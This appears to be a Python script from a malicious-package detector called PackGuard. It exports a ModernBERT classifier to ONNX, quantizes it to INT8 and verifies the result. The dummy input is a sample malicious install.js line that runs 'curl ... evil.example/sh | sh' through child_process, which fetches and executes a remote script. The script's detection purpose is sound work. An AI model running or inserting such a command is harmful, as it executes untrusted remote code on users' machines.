import argparse
import shutil
from pathlib import Path
from typing import Tuple

import numpy as np
import onnx
import onnxruntime as ort
import torch
from onnxruntime.quantization import QuantType, quantize_dynamic
from transformers import AutoModelForSequenceClassification, AutoTokenizer


def export_fp32_onnx(
    model_dir: str,
    fp32_onnx_path: Path,
    opset_version: int = 17,
) -> Tuple[AutoTokenizer, torch.nn.Module, torch.Tensor, torch.Tensor]:
    """
    Export ModernBERT to FP32 ONNX using standard eager attention so no CUDA-specific
    FlashAttention kernels are embedded into the portable CPU ONNX graph.
    """
    print(f"[PackGuard] Loading checkpoint for ONNX export: {model_dir}")
    tokenizer = AutoTokenizer.from_pretrained(model_dir)

    model = AutoModelForSequenceClassification.from_pretrained(
        model_dir,
        torch_dtype=torch.float32,
        attn_implementation="eager",
    )
    model.eval()
    model.to("cpu")

    sample_code = (
        "// Package: suspicious-pkg@1.0.0 | Stage1 Min NCD: 0.3800\n"
        "// File: install.js (offset=0, ncd=0.3800)\n"
        "const { exec } = require('child_process'); exec('curl -s http://evil.example/sh | sh');"
    )
    dummy_inputs = tokenizer(
        sample_code,
        return_tensors="pt",
        padding="max_length",
        max_length=128,
        truncation=True,
    )
    input_ids = dummy_inputs["input_ids"].to(torch.int64)
    attention_mask = dummy_inputs["attention_mask"].to(torch.int64)

    print(f"[PackGuard] Exporting FP32 ONNX graph (opset {opset_version}) -> {fp32_onnx_path}")
    with torch.no_grad():
        torch.onnx.export(
            model,
            (input_ids, attention_mask),
            str(fp32_onnx_path),
            export_params=True,
            opset_version=opset_version,
            do_constant_folding=True,
            input_names=["input_ids", "attention_mask"],
            output_names=["logits"],
            dynamic_axes={
                "input_ids": {0: "batch_size", 1: "sequence_length"},
                "attention_mask": {0: "batch_size", 1: "sequence_length"},
                "logits": {0: "batch_size"},
            },
        )

    onnx.checker.check_model(str(fp32_onnx_path))
    return tokenizer, model, input_ids, attention_mask


def quantize_onnx_int8(fp32_onnx_path: Path, int8_onnx_path: Path) -> None:
    """Apply 8-bit dynamic weight quantization (QUInt8 on MatMul) for CPU inference."""
    print(f"[PackGuard] Applying 8-bit dynamic quantization -> {int8_onnx_path}")
    quantize_dynamic(
        model_input=str(fp32_onnx_path),
        model_output=str(int8_onnx_path),
        weight_type=QuantType.QUInt8,
        op_types_to_quantize=["MatMul"],
        per_channel=False,
        reduce_range=False,
    )

    fp32_size_mb = fp32_onnx_path.stat().st_size / (1024**2)
    int8_size_mb = int8_onnx_path.stat().st_size / (1024**2)
    reduction_pct = (1.0 - (int8_size_mb / max(fp32_size_mb, 1e-6))) * 100.0
    print(
        f"[PackGuard] Quantization complete: {fp32_size_mb:.1f} MB (FP32) -> "
        f"{int8_size_mb:.1f} MB (INT8) [{reduction_pct:.1f}% smaller]"
    )


def verify_for_onnxruntime(
    int8_onnx_path: Path,
    pt_model: torch.nn.Module,
    input_ids: torch.Tensor,
    attention_mask: torch.Tensor,
) -> None:
    """Validate the quantized `.onnx` artifact using CPUExecutionProvider."""
    sess_options = ort.SessionOptions()
    sess_options.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
    session = ort.InferenceSession(
        str(int8_onnx_path),
        sess_options=sess_options,
        providers=["CPUExecutionProvider"],
    )

    ort_inputs = {
        "input_ids": input_ids.numpy().astype(np.int64),
        "attention_mask": attention_mask.numpy().astype(np.int64),
    }
    ort_logits = session.run(["logits"], ort_inputs)[0]

    with torch.no_grad():
        pt_logits = pt_model(input_ids=input_ids, attention_mask=attention_mask).logits.numpy()

    max_diff = float(np.max(np.abs(pt_logits - ort_logits)))
    pred_match = bool(np.array_equal(np.argmax(pt_logits, axis=-1), np.argmax(ort_logits, axis=-1)))
    print(
        f"[PackGuard] ONNX Runtime verification succeeded | "
        f"Max logit diff: {max_diff:.4f} | Top-1 prediction match: {pred_match}"
    )


def main():
    """Parse arguments, export ModernBERT checkpoint to FP32 ONNX, and quantize to INT8."""
    parser = argparse.ArgumentParser(
        description="PackGuard Stage 2: Export & 8-bit Quantize ModernBERT to ONNX"
    )
    parser.add_argument(
        "--model_dir",
        type=str,
        default="./checkpoints/packguard-modernbert/final",
        help="Path to fine-tuned ModernBERT checkpoint directory (or Hugging Face model ID)",
    )
    parser.add_argument(
        "--output_dir",
        type=str,
        default="./onnx_export",
        help="Directory to write quantized .onnx model and tokenizer files",
    )
    parser.add_argument(
        "--output_name",
        type=str,
        default="packguard_modernbert_int8.onnx",
        help="Filename for the final 8-bit quantized ONNX artifact",
    )
    parser.add_argument(
        "--opset",
        type=int,
        default=17,
        help="ONNX opset version (17 recommended for ONNX Runtime)",
    )
    parser.add_argument(
        "--keep_fp32",
        action="store_true",
        help="Retain the unquantized FP32 ONNX file alongside the INT8 artifact",
    )
    args = parser.parse_args()

    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    fp32_onnx_path = output_dir / "packguard_modernbert_fp32.onnx"
    int8_onnx_path = output_dir / args.output_name

    tokenizer, pt_model, input_ids, attention_mask = export_fp32_onnx(
        model_dir=args.model_dir,
        fp32_onnx_path=fp32_onnx_path,
        opset_version=args.opset,
    )

    quantize_onnx_int8(fp32_onnx_path=fp32_onnx_path, int8_onnx_path=int8_onnx_path)
    verify_for_onnxruntime(
        int8_onnx_path=int8_onnx_path,
        pt_model=pt_model,
        input_ids=input_ids,
        attention_mask=attention_mask,
    )

    tokenizer.save_pretrained(str(output_dir))
    model_path = Path(args.model_dir)
    if (model_path / "config.json").exists():
        shutil.copy2(model_path / "config.json", output_dir / "config.json")

    if not args.keep_fp32 and fp32_onnx_path.exists():
        fp32_onnx_path.unlink()
        ext_data = fp32_onnx_path.with_suffix(".onnx.data")
        if ext_data.exists():
            ext_data.unlink()

    print(f"[PackGuard] ONNX handoff bundle ready at: {int8_onnx_path.resolve()}")


if __name__ == "__main__":
    main()
